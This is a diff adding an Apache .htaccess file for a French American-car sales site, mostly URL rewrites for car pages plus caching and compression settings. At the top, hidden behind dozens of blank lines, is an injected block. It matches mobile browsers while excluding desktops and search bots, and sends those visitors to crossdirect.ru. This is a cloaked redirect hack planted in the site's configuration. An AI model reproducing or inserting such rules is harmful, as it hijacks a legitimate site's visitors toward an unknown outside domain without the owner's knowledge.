@@ -1,0 +1,356 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+########GET#######
+RewriteEngine on
+RewriteRule \.(jpg|png|gif|jpeg|bmp)$ - [L]
+RewriteCond %{HTTP_USER_AGENT} acs [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} alav [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} alca [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} amoi [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} audi [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} aste [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} avan [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} benq [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} bird [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} blac [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} blaz [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} brew [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} cell [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} cldc [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} cmd- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} dang [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} doco [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} eric [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} hipt [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} inno [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} ipaq [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} java [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} jigs [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} kddi [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} keji [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} leno [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} lg-c [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} lg-d [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} lg-g [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} lge- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} maui [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} maxo [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} midp [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mits [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mmef [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mobi [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mot- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} moto [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mwbp [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} nec- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} newt [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} noki [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} opwv [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} palm [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} pana [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} pant [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} pdxg [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} phil [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} play [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} pluc [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} port [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} prox [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} qtek [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} qwap [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sage [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sams [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sany [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sch- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sec- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} send [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} seri [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sgh- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} shar [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sie- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} siem [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} smal [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} smar [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sony [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sph- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} symb [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} t-mo [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} teli [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} tim- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} tosh [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} tsm- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} upg1 [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} upsi [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} vk-v [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} voda [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} w3cs [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} wap- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} wapa [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} wapi [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} wapp [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} wapr [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} webc [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} winw [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} winw [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} xda [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} xda- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} up.browser [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} up.link [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} windows.ce [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mini [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mmp [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} symbian [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} midp [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} wap [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} phone [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} ipad [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} iphone [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} iPad [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} iPhone [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} ipod [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} iPod [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} pocket [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mobile [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} android [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Android [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} pda [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} PPC [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Series60 [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Opera.Mini [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Moby [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Mobi [NC,OR]
+RewriteCond %{HTTP_ACCEPT} "text/vnd.wap.wml|application/vnd.wap.xhtml+xml" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} !windows.nt [NC]
+RewriteCond %{HTTP_USER_AGENT} !bsd [NC]
+RewriteCond %{HTTP_USER_AGENT} !x11 [NC]
+RewriteCond %{HTTP_USER_AGENT} !unix [NC]
+RewriteCond %{HTTP_USER_AGENT} !macos [NC]
+RewriteCond %{HTTP_USER_AGENT} !macintosh [NC]
+RewriteCond %{HTTP_USER_AGENT} !playstation [NC]
+RewriteCond %{HTTP_USER_AGENT} !google [NC]
+RewriteCond %{HTTP_USER_AGENT} !yandex [NC]
+RewriteCond %{HTTP_USER_AGENT} !bot [NC]
+RewriteCond %{HTTP_USER_AGENT} !libwww [NC]
+RewriteCond %{HTTP_USER_AGENT} !msn [NC]
+RewriteCond %{HTTP_USER_AGENT} !america [NC]
+RewriteCond %{HTTP_USER_AGENT} !avant [NC]
+RewriteCond %{HTTP_USER_AGENT} !download [NC]
+RewriteCond %{HTTP_USER_AGENT} !fdm [NC]
+RewriteCond %{HTTP_USER_AGENT} !maui [NC]
+RewriteCond %{HTTP_USER_AGENT} !webmoney [NC]
+RewriteCond %{HTTP_USER_AGENT} !windows-media-player [NC]
+RewriteRule ^(.*)$ http://crossdirect.ru [L,R=302]
+# For security reasons, Option followsymlinks cannot be overridden.
+Options +FollowSymLinks
+RewriteEngine On
+
+
+<IfModule mod_geoip.c>
+#GeoIPEnable On
+#GeoIPDBFile /usr/local/share/GeoIP/GeoIP.dat 
+#GeoIPDBFile /usr/local/share/GeoIP/GeoLiteCity.dat 
+
+# Start Redirecting countries
+
+# US
+#RewriteCond %{ENV:GEOIP_COUNTRY_CODE} ^US$
+#RewriteCond %{REQUEST_FILENAME} !-f
+#RewriteCond %{REQUEST_FILENAME} !-d
+#RewriteRule ^(.*)$ http://www.americancarcentrale.com/visitor.php [L]
+
+# Start Redirecting countries
+
+
+</IfModule>
+
+RewriteCond %{HTTP_HOST} !^www\.americancarcentrale\.com$ [NC]
+RewriteRule ^(.*)$ http://www.americancarcentrale.com/$1 [R=301,L]
+
+rewriteRule ^index\.(php|html|htm) http://www.americancarcentrale.com [R=permanent,L]
+
+
+RewriteRule ^((home))$ index.php
+
+##RewriteRule ^test/test$ page.php?page_id=test
+
+
+RewriteRule ^((page)/([a-zA-Z0-9-]+)?)$ page.php?page_id=$3
+
+RewriteRule ^voitures-americaines$ page.php?page_id=voitures-americaines
+RewriteRule ^vente-voitures-anciennes-americaines$ page.php?page_id=vente-voitures-anciennes-americaines
+RewriteRule ^classic-car$ page.php?page_id=classic-car
+RewriteRule ^american-cars$ page.php?page_id=american-cars
+RewriteRule ^exportation$ page.php?page_id=exportation
+RewriteRule ^acheter-une-voiture$ page.php?page_id=acheter-une-voiture
+RewriteRule ^transport-de-voiture$ page.php?page_id=transport-de-voiture
+RewriteRule ^voiture-d-occasion$ page.php?page_id=voiture-d-occasion
+RewriteRule ^voiture$ page.php?page_id=voiture
+RewriteRule ^importateur-voiture-americaine$ page.php?page_id=importateur-voiture-americaine
+RewriteRule ^voiture-americaine-a-restaurer$ page.php?page_id=voiture-americaine-a-restaurer
+RewriteRule ^mustang$ page.php?page_id=mustang
+
+RewriteRule ^voitures-americaines/vielle-voiture-americaine-pas-cher$ page.php?page_id=qwery1
+RewriteRule ^vente-voitures-anciennes-americaines/voiture-americaine-de-collection-a-vendre$ page.php?page_id=qwery2
+RewriteRule ^acheter-une-voiture/acheter-une-voiture-d-occasion$ page.php?page_id=qwery3
+RewriteRule ^voiture-d-occasion/voiture-americaine-occasion$ page.php?page_id=qwery4
+RewriteRule ^mustang/mustang-a-vendre$ page.php?page_id=qwery5
+RewriteRule ^mustang/mustang-gt-500-occasion$ page.php?page_id=qwery6
+RewriteRule ^mustang/mustang-shelby-gt-500-occasion$ page.php?page_id=qwery7
+RewriteRule ^mustang/mutsang-fastback$ page.php?page_id=mutsang-fastback
+RewriteRule ^mustang/mustang-1965$ page.php?page_id=mustang-1965
+RewriteRule ^mustang/mustang-1968$ page.php?page_id=mustang-1968
+RewriteRule ^mustang/mustang-1970$ page.php?page_id=mustang-1970
+RewriteRule ^mustang/mustang-1960$ page.php?page_id=mustang-1960
+RewriteRule ^mustang/mustang-v8$ page.php?page_id=mustang-v8
+RewriteRule ^mustang/mustang-occasion$ page.php?page_id=mustang-occasion
+RewriteRule ^mustang/mustang-1967$ page.php?page_id=mustang-1967
+RewriteRule ^mustang/mustang-boss-302$ page.php?page_id=mustang-boss-302
+RewriteRule ^mustang/mustang-1966$ page.php?page_id=mustang-1966
+RewriteRule ^mustang/mustang-1969$ page.php?page_id=mustang-1969
+RewriteRule ^mustang/mustang-2014$ page.php?page_id=mustang-2014
+RewriteRule ^mustang/mustang-2013$ page.php?page_id=mustang-2013
+RewriteRule ^mustang/mustang-2010$ page.php?page_id=mustang-2010
+RewriteRule ^mustang/mustang-2012$ page.php?page_id=mustang-2012
+RewriteRule ^mustang/mustang-2007$ page.php?page_id=mustang-2007
+RewriteRule ^mustang/mustang-2008$ page.php?page_id=mustang-2008
+RewriteRule ^mustang/mustang-2011$ page.php?page_id=mustang-2011
+RewriteRule ^mustang/mustang-2009$ page.php?page_id=mustang-2009
+RewriteRule ^mustang/mustang-cabriolet$ page.php?page_id=mustang-cabriolet
+RewriteRule ^mustang/mustang-1971$ page.php?page_id=mustang-1971
+RewriteRule ^mustang/mustang-bullitt$ page.php?page_id=mustang-bullitt
+RewriteRule ^site-voiture-occasion$ page.php?page_id=site-voiture-occasion
+RewriteRule ^voiture-neuve-pas-cher$ page.php?page_id=voiture-neuve-pas-cher
+RewriteRule ^Corvette$ page.php?page_id=Corvette
+RewriteRule ^vente-voitures-anciennes-americaines$ page.php?page_id=qwery9
+
+RewriteRule ^Corvette/corvette-c3$ page.php?page_id=corvette-c3
+RewriteRule ^Corvette/corvette-c1$ page.php?page_id=corvette-c1
+RewriteRule ^Corvette/corvette-c2$ page.php?page_id=corvette-c2
+RewriteRule ^Corvette/corvette-c1-1958$ page.php?page_id=corvette-c1-1958
+RewriteRule ^Corvette/corvette-c1-1960$ page.php?page_id=corvette-c1-1960
+RewriteRule ^Corvette/corvette-c3-1972$ page.php?page_id=corvette-c3-1972
+RewriteRule ^Corvette/corvette-c3-1976$ page.php?page_id=corvette-c3-1976
+
+
+RewriteRule ^((announces))$ announces.php
+RewriteRule ^((contacts))$ contact.php
+RewriteRule ^((nosstock))$ nos_stock.php
+RewriteRule ^((page)/([a-zA-Z0-9-]+)?)$ page.php?page_id=$3
+RewriteRule ^((faq))$ faq.php
+RewriteRule ^((car)/([0-9]+)?)$ carview.php?carid=$3
+RewriteRule ^((ebay)/([a-zA-Z0-9-]+)?)$ ebayview.php?carid=$3
+RewriteRule ^((search-result))$ carlist.php
+RewriteRule ^((advancesearch))$ advance-search.php
+RewriteRule ^((car-save))$ savecar.php
+RewriteRule ^((wishlist))$ wishlist.php
+RewriteRule ^((delete_selection)/([a-zA-Z0-9-]+))$ delete_selection.php?carId=$3
+RewriteRule ^((createaccount))$ create_account.php
+RewriteRule ^((loginaccount))$ login_account.php
+RewriteRule ^((editaccount))$ edit_account.php
+RewriteRule ^((forgotpswd))$ forgot_password.php
+RewriteRule ^((logout))$ logout_account.php
+RewriteRule ^((sitemap))$ sitemap.php
+
+RewriteRule ^((edmunds))$ Edmunds/index.html
+ErrorDocument 404 /404.php
+
+#RewriteCond %{REQUEST_URI}  ^/carview\.php$
+#RewriteCond %{QUERY_STRING} ^carid=([0-9]+)$
+#RewriteRule ^(.*)$ http://www.americancarcentrale.com/car/%1? [R=302,L]
+#RewriteRule ^((car)/([0-9]+)?)$ carview.php?carid=$3 [L]
+
+<IfModule mod_deflate.c>
+    #The following line is enough for .js and .css
+    AddOutputFilter DEFLATE js css
+    AddOutputFilterByType DEFLATE text/plain text/xml application/xhtml+xml text/css application/xml application/rss+xml application/atom_xml application/x-javascript application/x-httpd-php application/x-httpd-fastphp text/html
+
+    #The following lines are to avoid bugs with some browsers
+    BrowserMatch ^Mozilla/4 gzip-only-text/html
+    BrowserMatch ^Mozilla/4\.0[678] no-gzip
+    BrowserMatch \bMSIE !no-gzip !gzip-only-text/html 
+</IfModule>
+
+# BEGIN EXPIRES
+<IfModule mod_expires.c>
+    ExpiresActive On
+    ExpiresDefault "access plus 10 days"
+    ExpiresByType text/css "access plus 1 week"
+    ExpiresByType text/plain "access plus 1 month"
+    ExpiresByType image/gif "access plus 1 month"
+    ExpiresByType image/png "access plus 1 month"
+    ExpiresByType image/jpeg "access plus 1 month"
+    ExpiresByType application/x-javascript "access plus 1 month"
+    ExpiresByType application/javascript "access plus 1 week"
+    ExpiresByType application/x-icon "access plus 1 year"
+</IfModule>
+# END EXPIRES
+
+<IfModule mod_headers.c>
+    <FilesMatch "\.(js|css|xml|gz)$">
+        Header append Vary Accept-Encoding
+    </FilesMatch>
+    <FilesMatch "\.(ico|jpe?g|png|gif|swf)$">  
+        Header set Cache-Control "public"  
+    </FilesMatch>  
+    <FilesMatch "\.(css)$">  
+        Header set Cache-Control "public"  
+    </FilesMatch>  
+    <FilesMatch "\.(js)$">  
+        Header set Cache-Control "private"  
+    </FilesMatch>  
+    <FilesMatch "\.(x?html?|php)$">  
+        Header set Cache-Control "private, must-revalidate"  
+    </FilesMatch>
+</IfModule>
+
+
